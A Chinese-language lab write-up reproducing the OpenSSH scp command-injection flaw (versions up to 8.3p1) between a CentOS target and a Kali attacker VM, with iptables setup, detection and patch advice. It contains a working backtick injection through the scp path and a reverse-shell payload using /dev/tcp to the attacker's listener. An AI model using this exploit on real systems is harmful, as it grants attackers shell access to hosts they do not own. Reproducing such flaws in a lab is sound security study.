本文章由东塔网络安全学院-10期班学员--- **zxh** 投稿。

## 1.漏洞描述

（1）简介:2020年6月9日，研究人员Chinmay
Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。该漏洞属于命令执行漏洞，目前绝大多数linux系统受影响。

（2）scp介绍：scp是Linux下基于 ssh
登陆进行安全的远程文件拷贝命，用于不同Linux系统之间复制文件和目录。该命令由openssh的scp.c及其他相关代码实现。在本次漏洞复现中就是利用scp命令把一个kali系统的文件传输给Linux系统。

（3）漏洞类型：命令执行

（4）漏洞影响版本：OpenSSH <= 8.3p1

## 2.环境搭建

虚拟机安装CentOS和kali靶机环境：CentOS6，ip:192.168.5.138渗透机环境：Kali 2020，ip:192.168.5.130

## 3.centos机使用iptables策略配置环境，禁用ssh登录，只保留scp。

### （1）安装iptables(需要root用户)

yum install -y iptables

![](https://image.3001.net/images/20210108/1610110489_5ff85619ede0f69fb9082.png!small)

安装错误，接下来根据提示删除/var/cache/yum/i386/6/base/mirrorlist.txt文件

rm /var/cache/yum/i386/6/base/mirrorlist.txt

![](https://image.3001.net/images/20210108/1610110512_5ff8563056b57203aaef8.png!small)

没有找到文件，下面安装tree测试一下yum命令是否能够正常使用

yum install -y tree

![](https://image.3001.net/images/20210108/1610110549_5ff856558a99d10e30407.png!small)

还是报一样的错误，证明yum功能无法使用，上网查看yum无法使用解决办法。只需要在centos命令行界面下执行一下几条命令

sed -i "s|enabled=1|enabled=0|g" /etc/yum/pluginconf.d/fastestmirror.confmv
/etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backupcurl
-o /etc/yum.repos.d/CentOS-Base.repo https://www.xmpan.com/Centos-6-Vault-Aliyun.repoyum clean allyum makecache

![](https://image.3001.net/images/20210108/1610110561_5ff856613f013879862c6.png!small)

执行完成之后再次尝试安装iptables

yum install -y iptables

![1610110583_5ff85677f06e8903f3bd6.png!small?1610110584682](https://image.3001.net/images/20210108/1610110583_5ff85677f06e8903f3bd6.png!small?1610110584682)

### （2）安装iptables-services

yum install iptables-services

![1610110597_5ff8568559efa0dd0c9af.png!small?1610110598051](https://image.3001.net/images/20210108/1610110597_5ff8568559efa0dd0c9af.png!small?1610110598051)

### （3）设置策略，禁止ssh登陆，保留scp

iptables -F //清空默认规则service iptables start //启动iptables服务iptables -t filter -A
INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP //配置iptablesservice iptables
save //保存iptables配置iptables -L -n --line-number //显示iptables的规则和相对应的编号

![1610110604_5ff8568c171a49ad672f0.png!small?1610110604729](https://image.3001.net/images/20210108/1610110604_5ff8568c171a49ad672f0.png!small?1610110604729)

### （4） 在kali机测试ssh与scp在已设置iptables策略下的使用情况（需要root权限）

echo "123456" >1.txt //输入123456到当前目录下的1.txt文件scp 1.txt
root@192.168.5.138:/tmp/h.txt
//拷贝1.txt文件到centos机的/tmp/h.txt文件中ssh@root192.168.5.138 //直接使用ssh连接centos机

![1610110614_5ff856964b34ea9f32fd8.png!small?1610110615102](https://image.3001.net/images/20210108/1610110614_5ff856964b34ea9f32fd8.png!small?1610110615102)

scp功能正常使用，ssh连接centos失败，证明iptables策略(禁用ssh登录，只保留scp)成功有效。

## 4.漏洞复现

前提：需要知道centos的ssh账号密码

（1）查看CentOS的ssh版本

ssh -v

![1610110626_5ff856a20ed05be8da41e.png!small?1610110626696](https://image.3001.net/images/20210108/1610110626_5ff856a20ed05be8da41e.png!small?1610110626696)

（2）首先尝试一下利用scp命令，用kali对centOS进行写文件，复制文件。

scp 1.txt root@192.168.5.138:'`touch /tmp/test.txt` /tmp'

![1610110632_5ff856a87dfb5f2de5b43.png!small?1610110633223](https://image.3001.net/images/20210108/1610110632_5ff856a87dfb5f2de5b43.png!small?1610110633223)

成功将kali上面的文件传入道centOS上面。

（3）在kali机上监听5555端口

nc -lvp 5555

![1610110638_5ff856ae58098933e7346.png!small?1610110638994](https://image.3001.net/images/20210108/1610110638_5ff856ae58098933e7346.png!small?1610110638994)

（4）进行反弹shell

scp test.txt root@192.168.5.138:'`bash -i >& /dev/tcp/192.168.5.130/5555
0>&1`/tmp/test1.txt'

![1610110645_5ff856b588db30fdd8c65.png!small?1610110646625](https://image.3001.net/images/20210108/1610110645_5ff856b588db30fdd8c65.png!small?1610110646625)

（5）在kali机的监听界面执行任意系统命令，比如使用ifconfig可以查到centos机的ip。

![1610110649_5ff856b92ef6556c2841a.png!small?1610110649894](https://image.3001.net/images/20210108/1610110649_5ff856b92ef6556c2841a.png!small?1610110649894)

## 5.总结

有人可能觉得已经拿到ssh的用户名和密码了，直接ssh进去不就好了，回想过程，环境配置中禁用了ssh登录，只保留scp。不能直接使用ssh连接，我们是通过scp调用ssh，完成连接。该漏洞复现简单，漏洞危害大，利用局限性很大，需要ssh的用户密码。如果我们找到目标用户的用户名和密码，而且目标用户关闭了ssh，但是开启scp，那我们就可以利用这种漏洞反弹shell获取权限。

## 6.漏洞修复

（1）检测方法输入ssh -v命令查看openssh版本如显示的版本号<= 8.3p1，则漏洞存在。

（2）修复方案升级补丁。

参考文章：https://www.cnblogs.com/ch4nge/p/13867062.html

